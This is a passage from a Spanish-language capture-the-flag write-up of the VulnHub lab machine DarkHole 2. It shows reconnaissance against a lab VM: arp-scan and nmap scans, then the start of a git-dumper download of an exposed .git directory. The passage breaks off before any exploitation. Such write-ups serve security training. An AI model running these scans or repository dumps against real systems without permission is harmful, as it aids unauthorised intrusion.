<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.dd2fff12d2cb2eeb6cec9bb175a78a97f9a9c75528b420c4ddf294b836e24e37beeb597c4163a46055726eb5b7baddc29de90ceda8f7b4d3d51ecc8bd55da2ba.css" integrity="sha512-3S//EtLLLuts7JuxdaeKl/mpx1UotCDE3fKUuDbiTje+61l8QWOkYFVybrW3ut3CnekM7aj3tNPVHsyL1V2iug==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><base href=/writeups/vulnhub/darkhole2/><link rel=canonical href=/writeups/vulnhub/darkhole2/><title>DarkHole 2 | Pylon</title>
<meta name=description content><link rel=icon href=/favicon.ico sizes=32x32><link rel=icon href=/favicon.svg type=image/svg+xml><link rel=apple-touch-icon href=/apple-touch-icon.png sizes=180x180 type=image/png><link rel=icon href=/favicon-192x192.png sizes=192x192 type=image/png><link rel=icon href=/favicon-512x512.png sizes=512x512 type=image/png><link rel=manifest href=/manifest.webmanifest><meta property="og:title" content="DarkHole 2"><meta property="og:description" content="Enumeration Vamos a empezar escaneando la red local:
â”Œâ”€â”€(pylonã‰¿kali)-[~/â€¦/pylon/Vulnhub/DarkHole2/nmap] â””â”€$ sudo arp-scan -I eth0 --localnet [sudo] password for pylon: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192."><meta property="og:type" content="article"><meta property="og:url" content="/writeups/vulnhub/darkhole2/"><meta property="og:image" content="/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-07-18T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-18T00:00:00+00:00"><meta property="og:site_name" content="Pylon"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/cover.png"><meta name=twitter:title content="DarkHole 2"><meta name=twitter:description content="Enumeration Vamos a empezar escaneando la red local:
â”Œâ”€â”€(pylonã‰¿kali)-[~/â€¦/pylon/Vulnhub/DarkHole2/nmap] â””â”€$ sudo arp-scan -I eth0 --localnet [sudo] password for pylon: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192."><meta name=twitter:site content="@pylonetwork"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"Pylon","position":1},{"@type":"ListItem","item":"/writeups/","name":"Bienvenido","position":2},{"@type":"ListItem","item":"/writeups/vulnhub/","name":"Vulnhub","position":3},{"@type":"ListItem","name":"Dark Hole 2","position":4}]}</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=announcement data-id=global-alert-c83ee1e52a9ea33839072957647c51ff class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>Â¡Nuevo writeup de la mÃ¡quina "<a href=/writeups/thehackerslabs/backtothefuture/>BackToTheFuture</a>" de la plataforma TheHackersLabs!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-md><a class="navbar-brand me-auto me-lg-3" href=/>Pylon</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
</button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><nav class="section-nav docs-links"><ul class=list-unstyled><li><details open><summary>INTRO</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/intro/bienvenido/ style=display:flex;align-items:center>ðŸ‘‹ Bienvenido</a></li></ul></details></li><li><details open><summary>HACKTHEBOX</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackthebox/cap/ style=display:flex;align-items:center><img src=/images/icons/cap.png style=margin-right:6px width=21 height=auto>Cap</a></li></ul></details></li><li><details open><summary>DOCKERLABS</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/dockerlabs/eclipse/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Eclipse</a></li><li><a href=/writeups/dockerlabs/ejotapete/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Ejotapete</a></li><li><a href=/writeups/dockerlabs/upload/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Upload</a></li></ul></details></li><li><details open><summary>THEHACKERSLABS</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/thehackerslabs/backtothefuture/ style=display:flex;align-items:center><img src=/images/icons/backtothefuture.png style=margin-right:6px width=21 height=auto>BackToTheFuture</a></li><li><a href=/writeups/thehackerslabs/pinguping/ style=display:flex;align-items:center><img src=/images/icons/pinguping.png style=margin-right:6px width=21 height=auto>PinguPing</a></li><li><a href=/writeups/thehackerslabs/bocatacalamares/ style=display:flex;align-items:center><img src=/images/icons/bocatacalamares.png style=margin-right:6px width=21 height=auto>BocataCalamares</a></li><li><a href=/writeups/thehackerslabs/jaulacon2025/ style=display:flex;align-items:center><img src=/images/icons/jaulacon2025.png style=margin-right:6px width=21 height=auto>JaulaCon2025</a></li><li><a href=/writeups/thehackerslabs/mortadela/ style=display:flex;align-items:center><img src=/images/icons/mortadela.png style=margin-right:6px width=21 height=auto>Mortadela</a></li><li><a href=/writeups/thehackerslabs/zapasguapas/ style=display:flex;align-items:center><img src=/images/icons/zapasguapas.png style=margin-right:6px width=21 height=auto>ZapasGuapas</a></li><li><a href=/writeups/thehackerslabs/fruits/ style=display:flex;align-items:center><img src=/images/icons/fruits.png style=margin-right:6px width=21 height=auto>Fruits</a></li></ul></details></li><li><details open open><summary>VULNHUB</summary><ul class="list-unstyled list-nested"><li class=active><a aria-current=page href=/writeups/vulnhub/darkhole2/ style=display:flex;align-items:center><img src=/images/icons/vulnhub.png style=margin-right:6px width=21 height=auto>DarkHole 2</a></li></ul></details></li><li><details open><summary>HACKMYVM</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackmyvm/method/ style=display:flex;align-items:center><img src=/images/icons/method.png style=margin-right:6px width=21 height=auto>Method (Video)</a></li></ul></details></li></ul></nav></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>Pylon</h5><button type=button class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/challenges/intro/bienvenido/>Challenges</a></li><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://github.com/Pylonet><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul></div></div></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=UTF-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search indexâ€¦</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class=content>Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-md" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class="section-nav docs-links"><ul class=list-unstyled><li><details open><summary>INTRO</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/intro/bienvenido/ style=display:flex;align-items:center>ðŸ‘‹ Bienvenido</a></li></ul></details></li><li><details open><summary>HACKTHEBOX</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackthebox/cap/ style=display:flex;align-items:center><img src=/images/icons/cap.png style=margin-right:6px width=21 height=auto>Cap</a></li></ul></details></li><li><details open><summary>DOCKERLABS</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/dockerlabs/eclipse/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Eclipse</a></li><li><a href=/writeups/dockerlabs/ejotapete/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Ejotapete</a></li><li><a href=/writeups/dockerlabs/upload/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Upload</a></li></ul></details></li><li><details open><summary>THEHACKERSLABS</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/thehackerslabs/backtothefuture/ style=display:flex;align-items:center><img src=/images/icons/backtothefuture.png style=margin-right:6px width=21 height=auto>BackToTheFuture</a></li><li><a href=/writeups/thehackerslabs/pinguping/ style=display:flex;align-items:center><img src=/images/icons/pinguping.png style=margin-right:6px width=21 height=auto>PinguPing</a></li><li><a href=/writeups/thehackerslabs/bocatacalamares/ style=display:flex;align-items:center><img src=/images/icons/bocatacalamares.png style=margin-right:6px width=21 height=auto>BocataCalamares</a></li><li><a href=/writeups/thehackerslabs/jaulacon2025/ style=display:flex;align-items:center><img src=/images/icons/jaulacon2025.png style=margin-right:6px width=21 height=auto>JaulaCon2025</a></li><li><a href=/writeups/thehackerslabs/mortadela/ style=display:flex;align-items:center><img src=/images/icons/mortadela.png style=margin-right:6px width=21 height=auto>Mortadela</a></li><li><a href=/writeups/thehackerslabs/zapasguapas/ style=display:flex;align-items:center><img src=/images/icons/zapasguapas.png style=margin-right:6px width=21 height=auto>ZapasGuapas</a></li><li><a href=/writeups/thehackerslabs/fruits/ style=display:flex;align-items:center><img src=/images/icons/fruits.png style=margin-right:6px width=21 height=auto>Fruits</a></li></ul></details></li><li><details open open><summary>VULNHUB</summary><ul class="list-unstyled list-nested"><li class=active><a aria-current=page href=/writeups/vulnhub/darkhole2/ style=display:flex;align-items:center><img src=/images/icons/vulnhub.png style=margin-right:6px width=21 height=auto>DarkHole 2</a></li></ul></details></li><li><details open><summary>HACKMYVM</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackmyvm/method/ style=display:flex;align-items:center><img src=/images/icons/method.png style=margin-right:6px width=21 height=auto>Method (Video)</a></li></ul></details></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#shell-as-jehad>Shell as jehad</a></li><li><a href=#shell-as-losy>Shell as losy</a></li><li><a href=#shell-as-root>Shell as root</a></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><h1></h1><div style=display:flex;align-items:center><div style="border-left:8px solid #4ca113;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>DarkHole 2</h1></div><div style=display:flex;align-items:center;vertical-align:middle;margin-top:15px;margin-bottom:25px><img src=/images/logos/linux.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/images/logos/vlh.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#shell-as-jehad>Shell as jehad</a></li><li><a href=#shell-as-losy>Shell as losy</a></li><li><a href=#shell-as-root>Shell as root</a></li></ul></nav></div></details></nav><h2 id=enumeration>Enumeration<a href=#enumeration class=anchor aria-hidden=true>#</a></h2><p>Vamos a empezar escaneando la red local:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”Œâ”€â”€<span class=o>(</span>pylonã‰¿kali<span class=o>)</span>-<span class=o>[</span>~/â€¦/pylon/Vulnhub/DarkHole2/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>â””â”€$ sudo arp-scan -I eth0 --localnet
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> pylon:
</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192.168.64.128
</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
</span></span><span class=line><span class=cl>192.168.64.1    00:50:56:c0:00:08       VMware, Inc.
</span></span><span class=line><span class=cl>192.168.64.2    00:50:56:fb:55:46       VMware, Inc.
</span></span><span class=line><span class=cl>192.168.64.129  00:0c:29:95:1b:eb       VMware, Inc.
</span></span><span class=line><span class=cl>192.168.64.254  00:50:56:ed:c4:96       VMware, Inc.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>4</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: <span class=m>256</span> hosts scanned in 1.922 seconds <span class=o>(</span>133.19 hosts/sec<span class=o>)</span>. <span class=m>4</span> responded</span></span></code></pre></div></figure></div><p>Por la direciÃ³n MAC identifico la IP de la mÃ¡quina que es la <code>192.168.64.129</code>. Ahora vamos a realizar un escaneo de puertos con <code>nmap</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”Œâ”€â”€<span class=o>(</span>pylonã‰¿kali<span class=o>)</span>-<span class=o>[</span>~/â€¦/pylon/Vulnhub/DarkHole2/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>â””â”€$ nmap -p- --open -sS -n -Pn -vvv 192.168.64.129 -oG ports
</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-07-01 13:18 CEST
</span></span><span class=line><span class=cl>Initiating ARP Ping Scan at 13:18
</span></span><span class=line><span class=cl>Scanning 192.168.64.129 <span class=o>[</span><span class=m>1</span> port<span class=o>]</span>
</span></span><span class=line><span class=cl>Completed ARP Ping Scan at 13:18, 0.04s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
</span></span><span class=line><span class=cl>Initiating SYN Stealth Scan at 13:18
</span></span><span class=line><span class=cl>Scanning 192.168.64.129 <span class=o>[</span><span class=m>65535</span> ports<span class=o>]</span>
</span></span><span class=line><span class=cl>Discovered open port 80/tcp on 192.168.64.129
</span></span><span class=line><span class=cl>Discovered open port 22/tcp on 192.168.64.129
</span></span><span class=line><span class=cl>Completed SYN Stealth Scan at 13:18, 0.97s elapsed <span class=o>(</span><span class=m>65535</span> total ports<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.64.129
</span></span><span class=line><span class=cl>Host is up, received arp-response <span class=o>(</span>0.00060s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2025-07-01 13:18:21 CEST <span class=k>for</span> 1s
</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON
</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:95:1B:EB <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/share/nmap
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 1.13 seconds
</span></span><span class=line><span class=cl>           Raw packets sent: <span class=m>65536</span> <span class=o>(</span>2.884MB<span class=o>)</span> <span class=p>|</span> Rcvd: <span class=m>65536</span> <span class=o>(</span>2.621MB<span class=o>)</span></span></span></code></pre></div></figure></div><p>Vemos que tiene el puerto <code>22</code> y <code>80</code> abierto, vamos a realizar un segundo escaneo para identificar que servicios y versiones estÃ¡n corriendo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.95 scan initiated Tue Jul  1 13:19:34 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN target 192.168.64.129</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.64.129
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00015s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags:
</span></span><span class=line><span class=cl><span class=p>|</span>   /:
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID:
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-git:
</span></span><span class=line><span class=cl><span class=p>|</span>   192.168.64.129:80/.git/
</span></span><span class=line><span class=cl><span class=p>|</span>     Git repository found!
</span></span><span class=line><span class=cl><span class=p>|</span>     Repository description: Unnamed repository<span class=p>;</span> edit this file <span class=s1>&#39;description&#39;</span> to name the...
</span></span><span class=line><span class=cl><span class=p>|</span>_    Last commit message: i changed login.php file <span class=k>for</span> more secure
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: DarkHole V2
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:95:1B:EB <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Tue Jul  1 13:19:40 2025 -- 1 IP address (1 host up) scanned in 6.53 seconds</span></span></span></code></pre></div></figure></div><p>Vemos lo siguiente:</p><table><thead><tr><th>Puerto</th><th>InformaciÃ³n</th></tr></thead><tbody><tr><td>22/tcp</td><td>OpenSSH 8.2p1 Ubuntu</td></tr><tr><td>80/tcp</td><td>Apache httpd 2.4.41 / Nos reporta que a encontrado el directorio <code>.git</code> .</td></tr></tbody></table><p>Al ver que esta expuesto la carpeta <code>.git</code> decido dumpearla con <a href=https://github.com/arthaud/git-dumper>git-dumper</a> :</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”Œâ”€â”€<span class=o>(</span>venv<span class=o>)</span>â”€<span class=o>(</span>pylonã‰¿kali<span class=o>)</span>-<span class=o>[</span>~/â€¦/pylon/Vulnhub/DarkHole2/content<span class=o>]</span>
</span></span><span class=line><span class=cl>â””â”€$ git-dumper http://192.168.64.129/.git/ git
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Testing http://192.168.64.129/.git/HEAD <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Testing http://192.168.64.129/.git/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching .git recursively
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.gitignore <span class=o>[</span>404<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/COMMIT_EDITMSG <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/HEAD <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/config <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/info/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/logs/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/info/exclude <span class=o>[</span>200<span class=o>]</span>
